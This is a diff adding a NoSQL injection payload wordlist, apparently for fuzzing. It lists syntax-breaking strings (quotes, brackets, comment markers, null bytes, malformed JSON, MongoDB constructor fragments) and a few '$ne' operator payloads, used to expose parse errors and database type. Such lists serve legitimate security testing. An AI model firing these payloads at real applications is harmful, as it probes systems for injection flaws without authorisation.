@@ -1,0 +1,85 @@
+# NoSQL Injection - Syntax Injection Payloads
+# Used for error-based detection by breaking query syntax
+# Triggers parse errors that reveal database type
+
+# Quote injection
+'
+"
+`
+\'
+\"
+\`
+
+# Bracket injection
+{
+}
+[
+]
+{{
+}}
+[[
+]]
+
+# Operator characters
+$
+$$
+${
+${{
+
+# JSON breaking
+{"
+{'
+"}
+'}
+{"test": "
+{'test': '
+
+# Comment injection
+//
+/*
+*/
+#
+--
+
+# Special characters
+\
+\\
+\n
+\r
+\t
+\0
+%00
+
+# Combined syntax breaks
+'{"$ne": ""}'
+"{'$ne': ''}"
+'{$ne: ""}'
+'{"test":'
+'"test": null}'
+
+# MongoDB-specific syntax
+ObjectId('
+ISODate('
+NumberLong(
+BinData(
+
+# Escape sequences
+\x00
+\u0000
+\xff
+
+# Nested objects
+{{{
+}}}
+[[[
+]]]
+
+# Malformed JSON
+{"a": }
+{: "b"}
+{"a": "b",}
+[,]
+{,}
+
+# BSON-specific
+\x00\x00\x00\x00
